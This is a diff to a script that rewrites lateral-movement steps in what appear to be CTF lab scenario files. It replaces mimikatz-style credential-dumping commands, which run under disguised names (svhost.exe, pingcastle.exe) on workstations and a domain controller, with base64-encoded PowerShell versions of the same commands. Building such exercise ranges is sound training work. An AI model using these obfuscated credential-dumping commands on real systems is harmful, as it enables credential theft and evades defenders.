@@ -7,13 +7,13 @@
 # Solution: Use PowerShell to avoid "privilege::debug" (PowerShell already has debug privilege)
 
 # Fix for Windows01
-/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxkd2lnaHQuc2NocnV0ZVxcRG93bmxvYWRzXFxzdmhvc3QuZXhlIHNla3VybHNhOjpsb2dvblBhc3N3b3JkcyBleGl0'/g" /root/Desktop/CTF/4-movetowin01-INITIAL.sh
-/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxkd2lnaHQuc2NocnV0ZVxcRG93bmxvYWRzXFxzdmhvc3QuZXhlIHNla3VybHNhOjpsb2dvblBhc3N3b3JkcyBleGl0'/g" /root/Desktop/CTF/4-movetowin01-FINAL.sh
+/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAZAB3AGkAZwBoAHQALgBzAGMAaAByAHUAdABlAFwAXABEAG8AdwBuAGwAbwBhAGQAcwBcAFwAcwB2AGgAbwBzAHQALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='/g" /root/Desktop/CTF/4-movetowin01-INITIAL.sh
+/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAZAB3AGkAZwBoAHQALgBzAGMAaAByAHUAdABlAFwAXABEAG8AdwBuAGwAbwBhAGQAcwBcAFwAcwB2AGgAbwBzAHQALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='/g" /root/Desktop/CTF/4-movetowin01-FINAL.sh
 
 # Fix for Windows02
-/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxhbGFuLm1hcnNoYWxsXFxEb3dubG9hZHNcXHN2aG9zdC5leGUgc2VrdXJsc2E6OmxvZ29uUGFzc3dvcmRzIGV4aXQ='/g" /root/Desktop/CTF/5-movetowin02-INITIAL.sh
-/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxhbGFuLm1hcnNoYWxsXFxEb3dubG9hZHNcXHN2aG9zdC5leGUgc2VrdXJsc2E6OmxvZ29uUGFzc3dvcmRzIGV4aXQ='/g" /root/Desktop/CTF/5-movetowin02-FINAL.sh
+/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAYQBsAGEAbgAuAG0AYQByAHMAaABhAGwAbABcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHMAdgBoAG8AcwB0AC4AZQB4AGUAIABzAGUAawB1AHIAbABzAGEAOgA6AGwAbwBnAG8AbgBQAGEAcwBzAHcAbwByAGQAcwAgAGUAeABpAHQA'/g" /root/Desktop/CTF/5-movetowin02-INITIAL.sh
+/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAYQBsAGEAbgAuAG0AYQByAHMAaABhAGwAbABcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHMAdgBoAG8AcwB0AC4AZQB4AGUAIABzAGUAawB1AHIAbABzAGEAOgA6AGwAbwBnAG8AbgBQAGEAcwBzAHcAbwByAGQAcwAgAGUAeABpAHQA'/g" /root/Desktop/CTF/5-movetowin02-FINAL.sh
 
 # Fix for DC
-/bin/sed -i "s/'C:.*\\\\pingcastle.exe privilege::debug sekurlsa::krbtgt exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxBZG1pbmlzdHJhdG9yXFxEb3dubG9hZHNcXHBpbmdjYXN0bGUuZXhlIHNla3VybHNhOjprcmJ0Z3QgZXhpdA=='/g" /root/Desktop/CTF/6-movetodc-INITIAL.sh
-/bin/sed -i "s/'C:.*\\\\pingcastle.exe privilege::debug sekurlsa::krbtgt exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxBZG1pbmlzdHJhdG9yXFxEb3dubG9hZHNcXHBpbmdjYXN0bGUuZXhlIHNla3VybHNhOjprcmJ0Z3QgZXhpdA=='/g" /root/Desktop/CTF/6-movetodc-FINAL.sh
+/bin/sed -i "s/'C:.*\\\\pingcastle.exe privilege::debug sekurlsa::krbtgt exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHAAaQBuAGcAYwBhAHMAdABsAGUALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='/g" /root/Desktop/CTF/6-movetodc-INITIAL.sh
+/bin/sed -i "s/'C:.*\\\\pingcastle.exe privilege::debug sekurlsa::krbtgt exit'/'powershell.exe -Enc YwBtAGQAIAAvAGMAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAFwARABvAHcAbgBsAG8AYQBkAHMAXABcAHAAaQBuAGcAYwBhAHMAdABsAGUALgBlAHgAZQAgAHMAZQBrAHUAcgBsAHMAYQA6ADoAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzACAAZQB4AGkAdAA='/g" /root/Desktop/CTF/6-movetodc-FINAL.sh
